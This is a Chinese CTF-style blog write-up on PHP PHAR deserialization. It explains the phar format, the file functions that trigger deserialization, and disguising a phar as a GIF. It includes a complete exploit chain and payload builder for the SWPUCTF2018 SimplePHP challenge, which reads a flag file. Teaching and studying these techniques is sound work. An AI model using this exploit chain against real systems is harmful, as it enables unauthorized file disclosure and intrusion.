---
date: 2021-02-22T11:19:11+08:00
toc : on
title : 利用 phar 拓展 php 反序列化漏洞攻击面
---

## phar文件结构

所有的**Phar archives**包含以下3-4个部分。

1. a stub
2. a manifest describing the contents
3. the file contents
4. [optional] a signature for verifying Phar integrity (phar file format only)
   
### a stub
可以理解为一个标志，格式为`xxx<?php xxx; __HALT_COMPILER();?>`，前面内容不限，但必须以`__HALT_COMPILER();?>`来结尾，否则phar扩展将无法识别这个文件为phar文件。通常使用`setStub()`设置存根。
### a manifest
phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，也是反序列化中我们可以利用的部分。

![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-307317592.png)


### file contents
被压缩文件的内容。   
### a signature
![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-3050303077.png)
## demo
通过一个简单案例创建phar文件，记住要把`php.ini`中的**phar.readonly**设置为**Off**。
```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFile('hack.php');//添加要压缩的文件
?>
```
可以看到meta-data是以序列化的形式存储的：

![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-390463059.png)

有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过`phar://`伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：

| 受影响函数列表    |              |              |                   |
| ----------------- | ------------ | ------------ | ----------------- |
| fileatime         | filectime    | file_exists  | file_get_contents |
| file_put_contents | file         | filegroup    | fopen             |
| fileinode         | filemtime    | fileowner    | fileperms         |
| is_dir            | is_excutable | is_file      | is_link           |
| is_readable       | is_writable  | is_writeable | parse_ini_file    |
| copy              | unlink       | stat         | readfile          |

用一个小案例加以证明：
```php
<?php
class TestObject {
    public function __destruct()
    {
        echo "destruct";
    }
}
$filename='phar://phar.phar/hack.php';
file_get_contents($filename);
?>
```
执行结果如下：
```php
$ php .\phar_des.php
destruct
```

同时，phar可以伪装成任意格式文件，php识别phar文件是通过其文件头的**stub**，更确切一点来说是`__HALT_COMPILER();?>`这段代码，对**前面的内容**或者**后缀名**是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。
```php
<?php
    class TestObject {
    }
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFile('hack.php');//添加要压缩的文件
    $phar->stopBuffering();
?>
```
![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-3155836478.png)

即使把phar后缀修改，也不会影响利用。
```php
<?php
class TestObject {
    public function __destruct()
    {
        echo "\n"."destruct";
    }
}
$filename='phar://phar.gif/hack.php';
echo file_get_contents($filename);
?>
```
执行结果如下：
```php
$ php .\phar_des.php
destruct
```
## 利用实例
任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。

1. phar文件要能够上传到服务器端。
2. 要有可用的魔术方法作为“跳板”。
3. 文件操作函数的参数可控，且`:,/,phar`等特殊字符没有被过滤。

### SWPUCTF2018 SimplePHP
在查看文件处利用`?file`读取全部源代码,重点关注以下几处：
文件上传处的`function.php`有以下过滤：
```php
function upload_file_check() { 
    global $_FILES; 
    $allowed_types = array("gif","jpeg","jpg","png"); 
    $temp = explode(".",$_FILES["file"]["name"]); 
```
可以看到是白名单过滤，那上传这里做不了什么手脚，我们看看读取处。
```php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'function.php'; 
include 'class.php'; 
ini_set('open_basedir','/var/www/html/'); 
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "<h2>There is no file to show!<h2/>"; 
} 
$show = new Show(); 
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 
?> 
```
```php
 <?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```
我们先关注有没有可以读取文件的地方，所有内容一共有两处：

1. `highlight_file($this->source);`
2. `$text = base64_encode(file_get_contents($value));`

跟进第一处发现有所过滤
![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-10780885.png)

`f1ag`被ban，无法读取，看另外一处。

![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-2480299101.png)

在`get()`函数下发现有调用`file_get()`,`__get()`调用了`get()`，现在需要找到调用不可访问对象的地方。

![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-2434843641.png)

只要把Test实例化的对象存储在str的数组中，然后再去调用source属性（即Test中不存在的属性），就可以触发`__get()`了。现在找一找把对象当作字符串处理的地方。

![](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-1513267936.png)

不出意外的找到了，整个利用链也十分清晰。
```php
<?php
class C1e4r
{
    public $str;
    public $test;
}

class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;

}

$demo1 = new C1e4r();
$demo2 = new Show();
$demo3 = new Test();
$demo3->params['source'] = "/var/www/html/f1ag.php";//目标文件
$demo2->str['str'] = $demo3;   //触发__tostring
$demo1->str = $demo2;  //触发__get;
echo serialize($demo1);

$phar = new Phar("2.phar"); //生成phar文件
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');
$phar->setMetadata($demo1); //触发头是C1e4r类
$phar->addFromString("test.txt", "test"); //生成签名
$phar->stopBuffering();
?>
```
生成phar文件后，上传需要改后缀，然后直接读取即可。
```url
file.php?file=phar://./upload/c38d8861438aff49fb8385d9fd4df1e4.jpg
```

## 最后
其实`phar`兴起也是最近几年的事，到后来hitcon一年一题..其实考点都差不多，难的地方也是和其他内容打组合拳，下面还有一些关于phar的题目，感兴趣可以去试试。

- CISCN2019 Dropbox
- bytectf2019 ezcms
- hitcon···